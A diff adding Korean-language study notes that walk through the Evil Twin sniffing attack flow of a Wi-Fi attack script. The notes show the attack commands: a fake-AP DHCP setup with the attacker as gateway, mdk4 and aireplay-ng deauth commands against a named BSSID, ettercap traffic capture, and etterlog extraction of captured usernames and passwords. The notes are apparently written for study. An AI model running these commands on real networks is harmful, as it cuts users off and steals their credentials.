@@ -346,6 +346,90 @@ clean_tmpfiles         # 임시 파일 정리
 
 ---
 
+### set_network_interface_data 상세
+
+**Fake AP 네트워크에서 사용할 IP 주소 범위를 설정**하는 함수.
+
+#### IP를 4개 변수로 분리하는 이유
+충돌 시 3번째 옥텟만 숫자 연산으로 변경하기 위함.
+```bash
+# 문자열로 관리하면 변경 불가
+ip_range="192.169.1.0"
+
+# 분리하면 숫자 연산으로 간단히 변경
+third_octet=$((third_octet + 1))
+# 192.169.1.0 → 192.169.2.0 → 192.169.3.0 ...
+```
+
+#### 기본 IP 대역
+`192.169.x.x` 사용 — `192.168.x.x`가 아닌 이유는 공격자 시스템의 기존 네트워크와 충돌 방지.
+
+#### IP 충돌 체크
+```bash
+if ip route | grep 192.169.1.0 > /dev/null; then
+    # 이미 사용 중이면 third_octet을 1씩 증가하며 빈 대역 탐색
+    while true; do
+        third_octet=$((third_octet + 1))
+        if ! ip route | grep ${ip_range} > /dev/null; then break; fi
+    done
+fi
+```
+
+#### 최종 설정 변수
+| 변수 | 값 | 역할 |
+|------|-----|------|
+| `et_ip_range` | 192.169.1.0 | 네트워크 주소 |
+| `et_ip_router` | 192.169.1.1 | Fake AP 게이트웨이 (공격자 IP) |
+| `et_broadcast_ip` | 192.169.1.255 | 브로드캐스트 |
+| `et_range_start` | 192.169.1.33 | DHCP 할당 시작 |
+| `et_range_stop` | 192.169.1.100 | DHCP 할당 끝 |
+
+피해자가 연결되면 192.169.1.33~100 사이의 IP를 받고 게이트웨이가 공격자(192.169.1.1)로 설정되어 **모든 트래픽이 공격자를 거쳐가게 됨**.
+
+---
+
+### set_dhcp_config 상세
+
+**DHCP 서버 설정 파일(`/tmp/ag1/ag.dhcpd.conf`)을 생성**하는 함수.
+
+#### 라인별 설명
+```bash
+rm -rf "${tmpdir}${dhcpd_file}"   # 기존 설정 파일 삭제
+rm -rf "${tmpdir}clts.txt"        # 기존 클라이언트 목록 삭제
+ip link set "${interface}" up     # 인터페이스 활성화
+```
+
+```bash
+authoritative;              # 이 DHCP 서버가 네트워크 주인임을 선언
+default-lease-time 600;     # IP 임대 기본 시간 10분
+max-lease-time 7200;        # IP 임대 최대 시간 2시간
+```
+
+#### 모드별 DNS 분기
+| 모드 | DNS | 이유 |
+|------|-----|------|
+| et_sniffing | 진짜 DNS (8.8.8.8 등) | 피해자가 정상 인터넷 사용하면서 트래픽 스니핑 |
+| captive_portal | 공격자 IP (192.169.1.1) | 모든 도메인을 가짜 페이지로 redirect |
+
+#### leases 파일 탐색
+배포판마다 dhcp.leases 파일 위치가 다르기 때문에 존재하는 파일을 찾아서 설정에 포함.
+
+#### 생성되는 파일 내용
+```
+authoritative;
+default-lease-time 600;
+max-lease-time 7200;
+subnet 192.169.1.0 netmask 255.255.255.0 {
+    option broadcast-address 192.169.1.255;
+    option routers 192.169.1.1;
+    option subnet-mask 255.255.255.0;
+    option domain-name-servers 8.8.8.8, 8.8.4.4;
+    range 192.169.1.33 192.169.1.100;
+}
+```
+
+---
+
 ## 핵심 변수 정리
 
 | 변수 | 설명 |
@@ -378,4 +462,215 @@ clean_tmpfiles         # 임시 파일 정리
 
 ---
 
-*다음 단계: exec_et_sniffing_attack 각 함수 상세 분석*
+---
+
+### launch_dhcp_server
+
+새 xterm 창을 열고 **dhcpd(DHCP 서버)를 실행**하는 함수.
+
+```bash
+dhcpd -d -cf "/tmp/ag1/ag.dhcpd.conf" wlan0 2>&1 | tee -a /tmp/ag1/clts.txt
+```
+
+- `-d` → 데몬 모드 비활성 (창에서 직접 출력)
+- `-cf` → 설정 파일 경로 지정
+- `tee -a clts.txt` → DHCP 할당 내역을 `clts.txt`에 기록 (피해자 접속 로그)
+- 창 색상: 검정 바탕 + **분홍 글씨**
+- `sleep 2` → DHCP 서버 초기화 대기
+
+이 시점부터 피해자가 Fake AP에 연결되면 **IP를 자동으로 받을 수 있게 됨.**
+
+---
+
+### exec_et_deauth
+
+**DoS 공격(deauth)을 실행**하는 함수. 진짜 AP와 피해자의 연결을 강제로 끊음.
+
+#### DoS 방식별 명령어 (Auth DoS 선택 시)
+```bash
+# Auth DoS → mdk4 사용
+mdk4 wlan0mon a -a 58:86:94:49:8C:C6 -m
+
+# Aireplay 방식
+aireplay-ng --deauth 0 -a 58:86:94:49:8C:C6 wlan0mon
+
+# mdk4 deauth 방식
+mdk4 wlan0mon d -b /tmp/ag1/bl.txt -c 6
+```
+
+- `prepare_et_monitor` → DoS용 모니터 모드 인터페이스 준비
+- 창 색상: 검정 바탕 + **빨간 글씨**
+- DoS 추적 모드(`dos_pursuit_mode`)일 때 → 피해자가 채널을 바꿔도 추적하며 계속 deauth
+
+---
+
+### launch_ettercap_sniffing
+
+**ettercap을 실행해서 트래픽 스니핑을 시작**하는 함수.
+
+```bash
+ettercap -i wlan0 -q -T -z -S -u -l "/tmp/ag1/ag.ettercap"
+```
+
+- `-i wlan0` → Fake AP 인터페이스에서 캡처
+- `-q` → 조용한 모드
+- `-T` → 텍스트 모드
+- `-z` → 비프로미스큐어스 모드
+- `-S` → SSL 비활성
+- `-u` → 유니코드 지원 비활성
+- `-l` → 로그 저장 (저장 선택 시)
+- 창 색상: 검정 바탕 + **노란 글씨**
+
+이 시점부터 Fake AP를 통해 오가는 **모든 트래픽이 캡처**됨.
+
+---
+
+### set_et_control_script
+
+**공격 종료를 담당하는 별도 bash 스크립트를 `/tmp/ag1/` 에 생성**하는 함수.
+
+생성되는 스크립트의 역할:
+- `et_processes` 파일을 읽어서 **모든 프로세스 PID를 kill**
+- captive_portal 모드라면 캡처된 패스워드 시도 횟수를 화면에 표시
+- 사용자가 Enter를 누르면 이 스크립트가 실행되어 공격 종료
+
+---
+
+### launch_et_control_window
+
+**Control 창을 열고 `set_et_control_script`에서 생성한 스크립트를 실행**하는 함수.
+
+```bash
+manage_output "-hold -bg #000000 -fg #FFFFFF -T Control" \
+  "bash /tmp/ag1/ag.control_et.sh" "Control" "active"
+```
+
+- 창 색상: 검정 바탕 + **흰 글씨**
+- `"active"` 인자 → 이 창이 포커스를 가짐 (사용자가 Enter를 입력하는 창)
+- `et_process_control_window` 에 PID 저장
+
+---
+
+### write_et_processes
+
+**실행 중인 모든 공격 프로세스 PID를 파일에 기록**하는 함수.
+
+```bash
+# et_processes 배열 → /tmp/ag1/ag.et_processes 파일에 기록
+for item in "${et_processes[@]}"; do
+    echo "${item}" >> "/tmp/ag1/ag.et_processes"
+done
+```
+
+`set_et_control_script`에서 생성한 종료 스크립트가 이 파일을 읽어서 프로세스를 종료함.
+
+---
+
+### 공격 실행 중 (Enter 대기)
+
+```bash
+language_strings "${language}" 298 "yellow"  # "공격 중입니다. 종료하려면 Enter..."
+language_strings "${language}" 115 "read"    # Enter 입력 대기
+```
+
+사용자가 Enter를 누를 때까지 공격이 계속 실행됨.
+
+---
+
+### kill_et_windows
+
+**모든 공격 프로세스를 종료**하는 함수.
+
+```bash
+# DoS 추적 모드 프로세스 종료
+kill_dos_pursuit_mode_processes
+
+# et_processes 배열의 모든 PID 재귀적으로 kill
+for item in "${et_processes[@]}"; do
+    kill_pid_and_children_recursive "${item}"
+done
+
+# Control 창 종료
+kill "${et_process_control_window}"
+```
+
+---
+
+### recover_current_channel
+
+DoS 추적 모드 사용 시 **채널 파일에서 현재 채널을 복구**하는 함수.
+
+```bash
+recovered_channel=$(cat /tmp/ag1/ag.channelfile)
+channel="${recovered_channel}"
+```
+
+공격 중 피해자를 추적하며 채널이 바뀌었을 수 있으므로 최종 채널값을 복구함.
+
+---
+
+### restore_et_interface
+
+**공격 전 인터페이스 상태로 원상복구**하는 함수.
+
+```bash
+# IP 주소 제거
+ip addr del "192.169.1.1/255.255.255.0" dev wlan0
+ip route del "192.169.1.0/24" dev wlan0
+
+# 공격 전 모드로 복구
+if et_initial_state = "Managed":
+    → Managed 모드 유지
+else:
+    → 다시 Monitor 모드로 전환 (airmon start)
+
+# IP 포워딩 원래 값으로 복구
+control_routing_status "end"
+```
+
+---
+
+### parse_ettercap_log
+
+**ettercap이 캡처한 로그에서 계정/패스워드를 추출**하는 함수.
+
+```bash
+etterlog -L -p -i "/tmp/ag1/ag.ettercap.eci" | grep -E "USER:|PASS:"
+```
+
+추출 후 결과 파일 형식:
+```
+2024-01-01
+BSSID: 58:86:94:49:8C:C6
+Channel: 6
+ESSID: deemo2.4
+---------------
+USER: admin
+PASS: password123
+```
+
+캡처된 패스워드가 있으면 지정한 경로에 저장, 없으면 "캡처된 패스워드 없음" 메시지 출력.
+
+---
+
+## exec_et_sniffing_attack 전체 흐름 요약
+
+```
+set_hostapd_config       → Fake AP 설정 파일 생성
+launch_fake_ap           → Fake AP 신호 송출 시작 (hostapd)
+set_network_interface_data → IP 대역 설정
+set_dhcp_config          → DHCP 설정 파일 생성
+set_std_internet_routing_rules → IP포워딩 + NAT + iptables 규칙 설정
+launch_dhcp_server       → DHCP 서버 실행 (피해자 IP 할당)
+exec_et_deauth           → DoS 공격 시작 (피해자 강제 연결 해제)
+launch_ettercap_sniffing → 트래픽 스니핑 시작
+set_et_control_script    → 종료 스크립트 생성
+launch_et_control_window → Control 창 실행
+write_et_processes       → PID 파일 기록
+  ↓ [Enter 입력 대기]
+kill_et_windows          → 모든 프로세스 종료
+recover_current_channel  → 채널 복구 (DoS 추적 모드 시)
+restore_et_interface     → 인터페이스 원상복구
+parse_ettercap_log       → 캡처된 패스워드 추출 및 저장
+clean_tmpfiles           → 임시 파일 정리
+```
